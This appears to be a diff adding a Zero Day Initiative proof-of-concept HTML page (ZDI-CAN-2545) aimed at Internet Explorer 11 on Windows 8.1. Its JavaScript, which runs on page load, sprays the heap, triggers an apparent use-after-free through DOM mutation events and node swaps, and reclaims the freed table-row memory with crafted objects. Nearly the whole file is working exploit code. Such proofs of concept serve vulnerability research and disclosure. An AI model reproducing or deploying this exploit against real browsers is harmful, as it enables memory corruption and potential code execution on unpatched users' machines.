@@ -1,0 +1,150 @@
+
+<!-- 
+     ZDI-CAN-2545 Control proof of concept
+     HP Zero Day Initiative
+ 
+     Target: Windows 8.1 / IE11 (32-bit process), September 2014 patch level
+     Run with heap debug flags OFF
+     Recommended 2GB memory minimum
+-->
+<!doctype html> 
+<html>
+<head>
+<title>POC</title>
+<meta http-equiv="refresh" content="2"/>
+	
+<script type='text/javascript'>
+
+var bigString = "A";
+for (i = 0; i < 18; i++) bigString += bigString;
+var string2 = bigString.substr(0,0x30);
+var oDiv1 = document.createElement('div');
+
+var arr = new Array(0x1c0c0);
+
+function _alloc(){
+	for(var i=0;i<arr.length;i++)
+		arr[i] = new Array(0x1000/4-8);
+}
+
+function _spray(){
+	for(var i=0;i<arr.length;i++){
+		  for(var y=0;y<arr[i].length;y++){
+		  	//arr[i+1][y] = 0x10101010;
+		  	arr[i][y] = 0x41414141;
+		  }
+	}
+
+}
+
+
+var objs = null;
+function _init(){ objs = new Array(); };
+
+function _create(sz,element){
+	for(var i=0;i<sz;i++)
+		objs[i] = document.createElement(element);
+}
+
+function _free(){
+	for(var i=0;i<objs.length;i++)
+		objs[i] = null;
+	objs = null;
+
+	CollectGarbage();
+
+}
+
+eventHandler1_callCounter = 0;
+function eventHandler1(event)
+{
+	eventHandler1_callCounter++;
+	var fname = "eventHandler1_"+eventHandler1_callCounter;
+	try { window[fname](event); } catch(e){}
+}
+function trigger(){
+
+	id_0 = document.createElement("blockQuote");
+	id_1 = document.createElement("form");
+	id_2 = document.createElement("table");
+	document.body.appendChild(id_2);
+	id_3 = document.createElement("math");
+	id_4 = document.createElement("td");
+	document.body.appendChild(id_4);
+	documentFragment_0 = document.createDocumentFragment();
+	documentFragment_0.appendChild(id_1);
+	documentFragment_4 = document.createDocumentFragment();
+	documentFragment_4.appendChild(id_3);
+	id_1.addEventListener('DOMCharacterDataModified', eventHandler1, false);
+	id_0.addEventListener('DOMNodeInserted', eventHandler1, false);
+	id_2.createTHead();
+
+	id_02 = id_2.cloneNode(true);
+
+	id_03 = id_2.swapNode(id_2);
+	id_2['nextSibling']['previousSibling'].removeNode(false);
+	id_05 = id_2.swapNode(documentFragment_0);
+	event_0 = document.createEvent("MutationEvent");
+	event_0.initEvent("DOMCharacterDataModified", true, false);
+
+	id_1.dispatchEvent(event_0);
+	id_1.replaceNode(id_05);
+	id_1.applyElement(id_05,'inside');
+	id_0.insertAdjacentHTML('beforeEnd','A');
+
+	id_4.dispatchEvent(event_0);
+	id_45 = id_17.createTHead();
+
+	window.collection_bigString = oDiv1.getElementsByClassName(bigString);		// Place large block on wait list
+	window.collection_string2 = oDiv1.getElementsByClassName(string2);		// Clear wait list, leave wait list nearly empty
+
+	id_17.removeNode(false);
+
+        oDiv1.getElementsByClassName(bigString);	// Place large block on wait list
+	oDiv1.getElementsByClassName(bigString);	// Clear wait list, which includes our CTableRow
+
+	CollectGarbage();
+
+	document.body.innerHTML += '<svg><rect id="myRect1"/><use id="use1" x="50" y="50" xlink:href="#myRect"/></svg>';	
+
+	document.body.innerHTML += '<div></div><div></div><div></div><svg></svg>';
+
+	var objs = new Array();
+	for(var i=0;i<0x1000;i++)
+		objs[i] = document.createElement('div');
+
+	for(var i=0;i<0x1000;i++)
+		objs[i] = null;
+
+	objs=null;
+	CollectGarbage();
+
+	var objs = new Array();
+	for(var i=0;i<0x1000;i++){
+		objs[i] = document.createElement('video');
+	}
+
+        var objs = new Array();
+        for(var i=0;i<0x10000;i+=2){
+    	objs[i] = document.createElement('button');
+   	objs[i+1] = document.createElement('a');
+   	objs[i+1].coords="1,2,1094795585,4";
+        }
+
+
+
+}
+
+
+function eventHandler1_1(event){
+	id_02.deleteRow();
+	id_02.applyElement(id_03,'inside');
+}
+function eventHandler1_2(event){
+	id_17 = id_02.removeNode(true);
+}
+	</script>
+</head>
+<body onload='trigger();'>
+</body>
+</html>
